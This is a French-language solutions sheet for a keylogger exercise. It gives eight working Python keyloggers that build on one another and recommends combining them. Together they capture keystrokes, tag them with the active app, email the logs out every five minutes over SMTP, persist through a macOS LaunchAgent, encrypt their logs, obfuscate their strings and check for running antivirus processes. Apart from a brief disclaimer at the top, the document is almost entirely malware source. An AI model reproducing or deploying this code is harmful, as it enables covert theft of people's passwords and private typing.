SOLUTIONS - EXERCICE 19 KEYLOGGER
=================================

AVERTISSEMENT: Ces solutions sont fournies à titre pédagogique uniquement.
Utilisation personnelle sur machines propres uniquement.
Aucun usage sans autorisation explicite du propriétaire du système.

---

SOLUTION 1: KEYLOGGER BASIQUE NON-PERSISTANT
=============================================

Concept clé: Utiliser pynput.keyboard.Listener avec callbacks simples.

```python
#!/usr/bin/env python3

```python
import sys
import time
from pynput import keyboard

def creer_keylogger_basique():
    """Keylogger basique affichant frappes en console."""

    # Timestamp début
    debut = time.time()
    duree_max = 10  # 10 secondes

    def on_press(key):
        """Callback appui touche."""
        try:
            # Vérifier timeout
            if time.time() - debut > duree_max:
                return False  # Arrêter listener

            # Essayer obtenir caractère normal
            char = key.char
            if char is not None:
                print(char, end='', flush=True)

        except AttributeError:
            # Touche spéciale
            touches_mapping = {
                'Key.space': '[SPACE]',
                'Key.enter': '[ENTER]',
                'Key.backspace': '[BACKSPACE]',
                'Key.tab': '[TAB]',
                'Key.shift': '[SHIFT]',
                'Key.ctrl_l': '[CTRL]',
            }

            key_str = str(key)
            if key_str in touches_mapping:
                print(touches_mapping[key_str], end='', flush=True)

    # Créer et démarrer listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Attendre fin (timeout automatique via return False)
    listener.join()
    print("\n[Keylogger arrêté après 10 secondes]")

```
# Démarrage
```python
if __name__ == "__main__":
    print("[*] Keylogger basique - 10 secondes")
    try:
        creer_keylogger_basique()
    except KeyboardInterrupt:
        print("\n[Interrupted]")
```
```

Points clé:
✓ on_press callback simple
✓ Gestion timeout avec time.time()
✓ Distinction caractères normaux / touches spéciales
✓ Return False pour arrêter listener
✓ Print flush=True pour affichage temps réel

---

SOLUTION 2: LOGGING FICHIER AVEC TIMESTAMPS
============================================

Concept clé: Utiliser datetime pour timestamps précis + Python logging.

```python
#!/usr/bin/env python3

```python
import sys
import logging
from datetime import datetime
from pathlib import Path
from pynput import keyboard

class KeyloggerAvecLogs:
    """Keylogger avec logging fichier et timestamps."""

    def __init__(self):
        """Initialise logging et variables."""
        # Création répertoire logs
        self.log_dir = Path.home() / ".cache" / "keylogger"
        self.log_dir.mkdir(parents=True, exist_ok=True)

        # Nom fichier basé sur timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = self.log_dir / f"keylog_{timestamp}.txt"

        # Configurer logger
        self.logger = logging.getLogger("keylogger")
        self.logger.setLevel(logging.INFO)

        handler = logging.FileHandler(self.log_file, mode='w', encoding='utf-8')
        formatter = logging.Formatter('%(asctime)s | %(message)s', datefmt='%H:%M:%S.%f')[:-3]
        handler.setFormatter(formatter)

        self.logger.addHandler(handler)

        # Timing previous frappe (pour délai inter-frappes)
        self.last_time = datetime.now()

    def on_press(self, key):
        """Callback avec logging détaillé."""
        try:
            now = datetime.now()
            delta_ms = (now - self.last_time).total_seconds() * 1000

            char = key.char
            if char is not None:
                self.logger.info(f"CHAR: '{char}' (timing: {delta_ms:.0f}ms)")

            self.last_time = now

        except AttributeError:
            # Touches spéciales
            touches = {
                'Key.enter': '[ENTER]',
                'Key.space': '[SPACE]',
                'Key.backspace': '[BACKSPACE]',
            }

            key_str = str(key)
            if key_str in touches:
                self.logger.info(f"SPECIAL: {touches[key_str]}")

    def demarrer(self):
        """Démarre le keylogger."""
        print(f"[*] Logs: {self.log_file}")

        # Session info
        self.logger.info("=" * 70)
        self.logger.info(f"START_SESSION: {sys.platform}, Python {sys.version.split()[0]}")
        self.logger.info("=" * 70)

        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()

        try:
            listener.join()
        except KeyboardInterrupt:
            print("\n[Arrêt]")

            # Fin session
            self.logger.info("=" * 70)
            self.logger.info("END_SESSION: Keylogger arrêté")
            self.logger.info("=" * 70)

```
# Usage
```python
if __name__ == "__main__":
    kl = KeyloggerAvecLogs()
    kl.demarrer()
```
```

Points clé:
✓ pathlib.Path pour cross-platform
✓ datetime.now() pour timestamps microsecondes
✓ Calcul delta temps entre frappes
✓ logging.Formatter avec datefmt précis
✓ Session header/footer pour contexte

---

SOLUTION 3: FILTRAGE DE DONNÉES SENSIBLES
==========================================

Concept clé: Buffer pour mots complets + détection case-insensitive.

```python
#!/usr/bin/env python3

```python
import logging
from datetime import datetime
from pathlib import Path
from pynput import keyboard

```
MOTS_SENSIBLES = [
```python
    'password', 'passwd', 'pwd', 'secret', 'key', 'token',
    'credit', 'card', 'ssn', 'bitcoin', 'crypto',
    'motdepasse', 'mot_de_passe', 'clé', 'clé_api'
```
]

```python
class KeyloggerAvecFiltrage:
    """Keylogger avec filtrage données sensibles."""

    def __init__(self):
        """Initialise logging et buffer."""
        self.log_dir = Path.home() / ".cache" / "keylogger"
        self.log_dir.mkdir(parents=True, exist_ok=True)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = self.log_dir / f"keylog_{timestamp}.txt"

        self.logger = logging.getLogger("keylogger")
        self.logger.setLevel(logging.INFO)

        handler = logging.FileHandler(self.log_file, encoding='utf-8')
        formatter = logging.Formatter('%(asctime)s | %(levelname)s | %(message)s')
        handler.setFormatter(formatter)

        self.logger.addHandler(handler)

        # Buffer pour mots en cours
        self.buffer = ""
        self.mots_filtres = 0

    def contient_sensible(self, texte):
        """Vérifie si texte contient mot sensible."""
        texte_lower = texte.lower()
        for mot in MOTS_SENSIBLES:
            if mot.lower() in texte_lower:
                return True
        return False

    def traiter_buffer(self):
        """Analyse et enregistre contenu buffer."""
        if not self.buffer.strip():
            return

        if self.contient_sensible(self.buffer):
            self.logger.warning(
                f"[DONNÉES SENSIBLES] {len(self.buffer)} caractères filtrés"
            )
            self.mots_filtres += 1
        else:
            self.logger.info(f"WORD: '{self.buffer}'")

        self.buffer = ""

    def on_press(self, key):
        """Callback avec filtrage."""
        try:
            char = key.char
            if char is not None:
                # Caractère normal
                if char.isalnum() or char in ['-', '_', '.', '@']:
                    self.buffer += char
                else:
                    # Fin de mot
                    self.traiter_buffer()
                    if char not in [' ', '\n', '\t']:
                        self.logger.info(f"CHAR: '{char}'")

        except AttributeError:
            # Touche spéciale = fin de mot
            self.traiter_buffer()

            touches = {
                'Key.enter': '[ENTER]',
                'Key.space': '[SPACE]',
                'Key.backspace': '[BACKSPACE]',
            }

            key_str = str(key)
            if key_str in touches:
                self.logger.info(f"SPECIAL: {touches[key_str]}")

    def demarrer(self):
        """Démarre avec stats finales."""
        self.logger.info("START_SESSION avec filtrage sensible")

        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()

        try:
            listener.join()
        except KeyboardInterrupt:
            self.traiter_buffer()  # Vider dernier buffer
            self.logger.info(
                f"END_SESSION: {self.mots_filtres} mots sensibles filtrés"
            )

if __name__ == "__main__":
    kl = KeyloggerAvecFiltrage()
    kl.demarrer()
```
```

Points clé:
✓ Buffer accumulation caractères
✓ Détection fin mot (non-alphanumérique)
✓ Case-insensitive matching (.lower())
✓ Logging level WARNING pour sensibles
✓ Statistiques finales

---

SOLUTION 4: DÉTECTION APPLICATION ACTIVE (macOS)
================================================

Concept clé: Thread séparé + AppKit pour application courante.

```python
#!/usr/bin/env python3

```python
import sys
import threading
import logging
from datetime import datetime
from pathlib import Path
from pynput import keyboard

```
# ATTENTION: macOS uniquement! Utiliser PyObjC
```python
try:
    if sys.platform == 'darwin':
        from AppKit import NSWorkspace
except ImportError:
    print("pip install pyobjc-framework-Cocoa")

class KeyloggerAvecAppDetection:
    """Keylogger détectant application active."""

    def __init__(self):
        """Initialise logging et monitoring app."""
        self.log_dir = Path.home() / ".cache" / "keylogger"
        self.log_dir.mkdir(parents=True, exist_ok=True)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = self.log_dir / f"keylog_{timestamp}.txt"

        self.logger = logging.getLogger("keylogger")
        self.logger.setLevel(logging.INFO)

        handler = logging.FileHandler(self.log_file, encoding='utf-8')
        formatter = logging.Formatter('%(asctime)s | %(message)s')
        handler.setFormatter(formatter)

        self.logger.addHandler(handler)

        # App monitoring
        self.app_actuelle = None
        self.monitoring_actif = True
        self.thread_monitoring = None

    def obtenir_app_active(self):
        """Retourne nom application courante (macOS)."""
        if sys.platform != 'darwin':
            return "UNKNOWN"

        try:
            workspace = NSWorkspace.sharedWorkspace()
            app = workspace.frontmostApplication()
            return app.localizedName() if app else "UNKNOWN"
        except:
            return "ERROR"

    def monitorer_app(self):
        """Thread qui détecte changement application."""
        while self.monitoring_actif:
            app = self.obtenir_app_active()

            if app != self.app_actuelle:
                self.logger.info(f"APP_CHANGE: {self.app_actuelle} → {app}")
                self.app_actuelle = app

            threading.Event().wait(0.5)  # Vérifier tous 500ms

    def on_press(self, key):
        """Callback avec contexte app."""
        try:
            char = key.char
            if char is not None:
                self.logger.info(f"[{self.app_actuelle}] CHAR: '{char}'")
        except AttributeError:
            pass

    def demarrer(self):
        """Démarre avec monitoring app parallèle."""
        print(f"[*] Logs: {self.log_file}")

        # Lancer thread monitoring
        self.thread_monitoring = threading.Thread(
            target=self.monitorer_app,
            daemon=True
        )
        self.thread_monitoring.start()

        # Lancer listener
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()

        try:
            listener.join()
        except KeyboardInterrupt:
            self.monitoring_actif = False
            self.logger.info("END_SESSION")
            print("[Arrêt]")

if __name__ == "__main__":
    if sys.platform != 'darwin':
        print("[!] Cette solution fonctionne sur macOS uniquement")
        print("[!] Adapter pour Linux (wmctrl) ou Windows (ctypes)")
        sys.exit(1)

    kl = KeyloggerAvecAppDetection()
    kl.demarrer()
```
```

Points clé:
✓ AppKit NSWorkspace (macOS)
✓ Thread daemon séparé
✓ Détection changement app
✓ Cache pour éviter re-détection
✓ Contexte app dans logs

---

SOLUTION 5: ENVOI LOGS PAR EMAIL (SMTP)
========================================

Concept clé: Thread asynchrone + smtplib avec auth token.

```python
#!/usr/bin/env python3

```python
import os
import smtplib
import threading
import logging
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from datetime import datetime
from pathlib import Path
from pynput import keyboard

class KeyloggerAvecEmail:
    """Keylogger exfiltrant logs par email."""

    SMTP_SERVER = "smtp.gmail.com"
    SMTP_PORT = 587

    def __init__(self, email_from, email_to):
        """Initialise logging et email."""
        self.log_dir = Path.home() / ".cache" / "keylogger"
        self.log_dir.mkdir(parents=True, exist_ok=True)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = self.log_dir / f"keylog_{timestamp}.txt"

        self.logger = logging.getLogger("keylogger")
        self.logger.setLevel(logging.INFO)

        handler = logging.FileHandler(self.log_file, encoding='utf-8')
        formatter = logging.Formatter('%(asctime)s | %(message)s')
        handler.setFormatter(formatter)

        self.logger.addHandler(handler)

        # Email config
        self.email_from = email_from
        self.email_to = email_to

        # Token obtenu de: https://myaccount.google.com/apppasswords
        # JAMAIS hardcoder! Utiliser variable d'environnement
        self.app_password = os.getenv('KEYLOGGER_EMAIL_TOKEN')

        if not self.app_password:
            raise ValueError("Variable KEYLOGGER_EMAIL_TOKEN manquante")

        # Intervalle envoi (secondes)
        self.intervalle_email = 300  # 5 minutes
        self.dernier_envoi = datetime.now()

    def envoyer_logs(self):
        """Envoie logs par email (thread séparé)."""
        try:
            if not self.log_file.exists():
                return

            # Créer message
            msg = MIMEMultipart()
            msg['From'] = self.email_from
            msg['To'] = self.email_to
            msg['Subject'] = f"[LOGS] {datetime.now().strftime('%Y-%m-%d %H:%M')}"

            # Pièce jointe
            with open(self.log_file, 'rb') as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())

            part.add_header('Content-Disposition', f'attachment; filename= {self.log_file.name}')
            msg.attach(part)

            # Envoyer
            with smtplib.SMTP(self.SMTP_SERVER, self.SMTP_PORT) as server:
                server.starttls()
                server.login(self.email_from, self.app_password)
                server.send_message(msg)

            self.logger.info(f"EMAIL: Logs envoyés à {self.email_to}")
            self.dernier_envoi = datetime.now()

        except Exception as e:
            self.logger.error(f"EMAIL_ERROR: {e}")

    def on_press(self, key):
        """Callback avec check envoi."""
        try:
            char = key.char
            if char is not None:
                self.logger.info(f"CHAR: '{char}'")

            # Vérifier si temps d'envoyer
            now = datetime.now()
            if (now - self.dernier_envoi).total_seconds() > self.intervalle_email:
                # Lancer thread asynchrone
                thread = threading.Thread(target=self.envoyer_logs, daemon=True)
                thread.start()

        except AttributeError:
            pass

    def demarrer(self):
        """Démarre keylogger avec envoi email."""
        print(f"[*] Logs: {self.log_file}")
        print(f"[*] Envoi email: {self.email_to} tous 5 minutes")

        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()

        try:
            listener.join()
        except KeyboardInterrupt:
            self.logger.info("END_SESSION")
            print("[Arrêt]")

if __name__ == "__main__":
    # CONFIGURATION NÉCESSAIRE:
    # 1. Créer compte Google
    # 2. Obtenir App Password: https://myaccount.google.com/apppasswords
    # 3. Exporter: export KEYLOGGER_EMAIL_TOKEN="votre_token_ici"
    # 4. Lancer: python solution5.py

    email_from = "your.email@gmail.com"
    email_to = "recipient@gmail.com"

    kl = KeyloggerAvecEmail(email_from, email_to)
    kl.demarrer()
```
```

SÉCURITÉ CRITIQUE:
✓ Utiliser App Passwords Gmail (pas mot de passe!)
✓ Stocker token dans variable d'environnement JAMAIS fichier
✓ HTTPS/TLS pour SMTP
✓ Thread asynchrone pour pas bloquer
✓ Error handling robuste

---

SOLUTION 6: PERSISTENCE SYSTÈME - macOS LaunchAgent
====================================================

Concept clé: Créer plist dans LaunchAgents pour démarrage auto.

```python
#!/usr/bin/env python3

```python
import sys
import os
import plistlib
from pathlib import Path

def installer_launchagent():
    """Installe LaunchAgent pour démarrage automatique macOS."""

    if sys.platform != 'darwin':
        print("[!] LaunchAgent macOS uniquement")
        return False

    # Chemin plist
    home = Path.home()
    launch_agents = home / "Library" / "LaunchAgents"
    plist_file = launch_agents / "com.user.keylogger.plist"

    # Chemin script Python
    script_dir = home / ".local" / "lib" / "keylogger"
    script_path = script_dir / "main.py"

    print("[*] Installation LaunchAgent")
    print(f"[*] Chemin: {plist_file}")

    # Créer répertoire s'il n'existe pas
    launch_agents.mkdir(parents=True, exist_ok=True)
    script_dir.mkdir(parents=True, exist_ok=True)

    # Contenu plist
    plist_content = {
        'Label': 'com.user.keylogger',
        'Program': str(script_path),
        'RunAtLoad': True,
        'KeepAlive': True,
        'StandardErrorPath': str(home / '.cache' / 'keylogger' / 'error.log'),
        'StandardOutPath': str(home / '.cache' / 'keylogger' / 'output.log'),
        'UserName': os.getenv('USER'),
    }

    try:
        # Écrire plist
        with open(plist_file, 'wb') as f:
            plistlib.dump(plist_content, f)

        print(f"[+] LaunchAgent créé: {plist_file}")

        # Permissions
        os.chmod(plist_file, 0o644)

        print(f"[+] Permissions: 644")

        # Charger
        os.system(f"launchctl load {plist_file}")
        print(f"[+] Chargé dans launchctl")

        return True

    except Exception as e:
        print(f"[-] Erreur: {e}")
        return False

def desinstaller_launchagent():
    """Désinstalle LaunchAgent."""

    home = Path.home()
    plist_file = home / "Library" / "LaunchAgents" / "com.user.keylogger.plist"

    if not plist_file.exists():
        print(f"[!] {plist_file} n'existe pas")
        return

    try:
        os.system(f"launchctl unload {plist_file}")
        plist_file.unlink()
        print(f"[+] Désinstallé: {plist_file}")
    except Exception as e:
        print(f"[-] Erreur: {e}")

def verifier_installation():
    """Vérifie si LaunchAgent est installé."""

    home = Path.home()
    plist_file = home / "Library" / "LaunchAgents" / "com.user.keylogger.plist"

    if plist_file.exists():
        print(f"[+] LaunchAgent installé: {plist_file}")

        # Vérifier si actif
        result = os.popen("launchctl list | grep keylogger").read()
        if result:
            print(f"[+] Actuellement actif")
        else:
            print(f"[-] Inactif")
    else:
        print(f"[-] LaunchAgent non installé")

if __name__ == "__main__":
    if sys.platform != 'darwin':
        print("[!] Seulement macOS")
        sys.exit(1)

    if len(sys.argv) < 2:
        print("Usage: python solution6.py [install|uninstall|check]")
        sys.exit(1)

    cmd = sys.argv[1]

    if cmd == "install":
        installer_launchagent()
    elif cmd == "uninstall":
        desinstaller_launchagent()
    elif cmd == "check":
        verifier_installation()
```
```

UTILISATION:
```bash
python solution6.py install    # Installer
python solution6.py check      # Vérifier
python solution6.py uninstall  # Désinstaller
```

Points clé:
✓ Plist format macOS
✓ RunAtLoad: True pour boot
✓ KeepAlive: True pour redémarrage auto
✓ Gestion erreurs fichier
✓ Désinstallation propre

---

SOLUTION 7: ENCRYPTION LOGS
=============================

Concept clé: Utiliser cryptography.fernet pour AES symétrique.

```python
#!/usr/bin/env python3

```python
import os
import sys
import logging
from datetime import datetime
from pathlib import Path
from pynput import keyboard

try:
    from cryptography.fernet import Fernet
except ImportError:
    print("pip install cryptography")
    sys.exit(1)

class KeyloggerAvecEncryption:
    """Keylogger avec encryption des logs."""

    def __init__(self, cle=None):
        """Initialise logging et encryption."""
        self.log_dir = Path.home() / ".cache" / "keylogger"
        self.log_dir.mkdir(parents=True, exist_ok=True)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = self.log_dir / f"keylog_{timestamp}.txt"
        self.encrypted_file = self.log_file.with_suffix('.enc')

        # Clé encryption
        if cle is None:
            # Générer nouvelle clé
            cle = Fernet.generate_key()
            print(f"[*] Nouvelle clé générée:")
            print(f"    {cle.decode()}")
            print(f"[*] Sauvegardez cette clé pour déchiffrer!")

        if isinstance(cle, str):
            cle = cle.encode()

        self.cipher = Fernet(cle)

        self.logger = logging.getLogger("keylogger")
        self.logger.setLevel(logging.INFO)

        handler = logging.FileHandler(self.log_file, encoding='utf-8')
        formatter = logging.Formatter('%(asctime)s | %(message)s')
        handler.setFormatter(formatter)

        self.logger.addHandler(handler)

    def chiffrer_logs(self):
        """Chiffre le fichier log actuel."""
        try:
            if not self.log_file.exists():
                return

            # Lire fichier en clair
            with open(self.log_file, 'rb') as f:
                donnees_claires = f.read()

            # Chiffrer
            donnees_chiffrees = self.cipher.encrypt(donnees_claires)

            # Écrire fichier chiffré
            with open(self.encrypted_file, 'wb') as f:
                f.write(donnees_chiffrees)

            self.logger.info(f"ENCRYPTION: Fichier chiffré en {self.encrypted_file.name}")

            # Supprimer fichier en clair
            self.log_file.unlink()

            return True

        except Exception as e:
            self.logger.error(f"ENCRYPTION_ERROR: {e}")
            return False

    def dechiffrer_logs(self, fichier_chiffre, cle):
        """Déchiffre un fichier log."""
        try:
            if isinstance(cle, str):
                cle = cle.encode()

            cipher = Fernet(cle)

            with open(fichier_chiffre, 'rb') as f:
                donnees_chiffrees = f.read()

            donnees_claires = cipher.decrypt(donnees_chiffrees)

            return donnees_claires.decode('utf-8')

        except Exception as e:
            print(f"[-] Erreur déchiffrement: {e}")
            return None

    def on_press(self, key):
        """Callback standard."""
        try:
            char = key.char
            if char is not None:
                self.logger.info(f"CHAR: '{char}'")
        except AttributeError:
            pass

    def demarrer(self):
        """Démarre avec encryption."""
        print(f"[*] Logs (clair): {self.log_file}")
        print(f"[*] Logs (chiffré): {self.encrypted_file}")

        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()

        try:
            listener.join()
        except KeyboardInterrupt:
            print("\n[*] Chiffrement en cours...")
            if self.chiffrer_logs():
                print(f"[+] Chiffré: {self.encrypted_file}")
            else:
                print("[-] Erreur chiffrement")

```
# Utilitaire déchiffrement
```python
def dechiffrer_fichier(fichier_chiffre, cle_string):
    """Déchiffre un fichier log."""

    kl = KeyloggerAvecEncryption(cle_string)
    contenu = kl.dechiffrer_logs(Path(fichier_chiffre), cle_string)

    if contenu:
        print(f"\nContenu déchiffré:")
        print("=" * 70)
        print(contenu)
        print("=" * 70)

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "decrypt":
        if len(sys.argv) < 4:
            print("Usage: python solution7.py decrypt <fichier.enc> <clé>")
            sys.exit(1)

        dechiffrer_fichier(sys.argv[2], sys.argv[3])
    else:
        kl = KeyloggerAvecEncryption()
        kl.demarrer()
```
```

UTILISATION:
```bash
# Démarrer avec encryption
python solution7.py

# Déchiffrer fichier
python solution7.py decrypt keylog_20240101_120000.enc "votre_clé_ici"
```

Points clé:
✓ Fernet (AES-128-CBC)
✓ Génération/sauvegarde clé
✓ Chiffrement transparent
✓ Déchiffrement sur demande
✓ Suppression fichier clair après chiffrement

---

SOLUTION 8: OBFUSCATION ET EVASION
==================================

Concept clé: Obfuscation strings + détection antivirus.

```python
#!/usr/bin/env python3

```python
import base64
import os
import sys
import random
import time
import logging
from datetime import datetime
from pathlib import Path
from pynput import keyboard

```
# Obfuscation strings critiques
```python
class ObfuscatedStrings:
    """Strings obfusquées en base64."""

    @staticmethod
    def decode(s):
        """Décode string base64."""
        try:
            return base64.b64decode(s).decode('utf-8')
        except:
            return s

    # Strings critiques obfusquées
    CACHE_DIR = base64.b64encode(b".cache").decode()
    KEYLOGGER_DIR = base64.b64encode(b"keylogger").decode()
    LOG_FILE = base64.b64encode(b"activity.log").decode()
    PYNPUT = base64.b64encode(b"pynput").decode()

class KeyloggerObfusque:
    """Keylogger avec obfuscation."""

    def __init__(self):
        """Initialise avec obfuscation."""

        # Jitter: délai aléatoire avant démarrage (0-30 secondes)
        jitter = random.randint(0, 30)
        print(f"[*] Démarrage dans {jitter} secondes...")
        time.sleep(jitter)

        # Décoder paths
        cache_dir_name = ObfuscatedStrings.decode(ObfuscatedStrings.CACHE_DIR)
        keylogger_dir_name = ObfuscatedStrings.decode(ObfuscatedStrings.KEYLOGGER_DIR)
        log_file_name = ObfuscatedStrings.decode(ObfuscatedStrings.LOG_FILE)

        # Créer répertoires
        self.log_dir = Path.home() / cache_dir_name / keylogger_dir_name
        self.log_dir.mkdir(parents=True, exist_ok=True)

        self.log_file = self.log_dir / log_file_name

        # Détection antivirus avant démarrage
        self._verifier_antivirus()

        # Configurer logger
        self.logger = logging.getLogger("logger")
        self.logger.setLevel(logging.INFO)

        handler = logging.FileHandler(str(self.log_file), encoding='utf-8')
        formatter = logging.Formatter('%(asctime)s | %(message)s')
        handler.setFormatter(formatter)

        self.logger.addHandler(handler)

    def _verifier_antivirus(self):
        """Vérifie présence antivirus/malware scanning."""

        print("[*] Vérification environnement...")

        # macOS
        if sys.platform == 'darwin':
            av_processes = ['CbDefense', 'Falcon', 'MsSense']

            for av in av_processes:
                result = os.popen(f"ps aux | grep {av} | grep -v grep").read()
                if result:
                    print(f"[!] ATTENTION: {av} détecté")
                    # Décision: arrêter ou continuer?
                    # Pour démo: continuer

        # Windows
        if sys.platform == 'win32':
            try:
                import psutil
                for proc in psutil.process_iter(['name']):
                    if any(av in proc.info['name'].lower()
                           for av in ['defender', 'mcafee', 'norton']):
                        print(f"[!] ATTENTION: Antivirus détecté")
            except:
                pass

    def _verifier_fichier_log(self):
        """Vérifie accès au fichier log."""
        try:
            # Tenter écriture test
            with open(self.log_file, 'a') as f:
                f.write("test")
            return True
        except:
            print("[-] Erreur accès fichier log!")
            return False

    def _rotation_logs(self):
        """Rotation logs pour éviter gros fichier visible."""

        try:
            if self.log_file.stat().st_size > 1_000_000:  # 1MB
                # Renommer ancien log
                renamed = self.log_file.with_name(
                    self.log_file.name + f".{datetime.now().timestamp()}"
                )
                self.log_file.rename(renamed)

                self.logger.info("LOG_ROTATED")
        except:
            pass

    def on_press(self, key):
        """Callback standard."""
        try:
            char = key.char
            if char is not None:
                self.logger.info(f"C:{ord(char)}")  # Encoder en ASCII
        except AttributeError:
            pass

    def demarrer(self):
        """Démarre avec sécurité."""

        if not self._verifier_fichier_log():
            print("[-] Impossible d'accéder fichier log")
            return

        self.logger.info("START")

        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()

        try:
            while True:
                time.sleep(1)
                self._rotation_logs()
                listener.join(timeout=1)
        except KeyboardInterrupt:
            self.logger.info("STOP")
            print("[Arrêt]")

if __name__ == "__main__":
    try:
        kl = KeyloggerObfusque()
        kl.demarrer()
    except Exception as e:
        print(f"[-] Erreur: {e}")
```
```

Points clé:
✓ Obfuscation base64 strings
✓ Jitter timing aléatoire
✓ Détection antivirus pré-launch
✓ Vérification permissions fichier
✓ Rotation logs (limite taille)
✓ Encodage données (ASCII numerique)

---

PROGRESSION RECOMMANDÉE
=======================

1. Commencer Solutions 1-2 (basique)
2. Ajouter Solution 3 (sécurité)
3. Essayer Solution 4 ou 5 (features)
4. Solution 6 pour persistence
5. Solution 7-8 pour advanced

Chaque solution étend la précédente. Combiner progressivement.

FIN DES SOLUTIONS
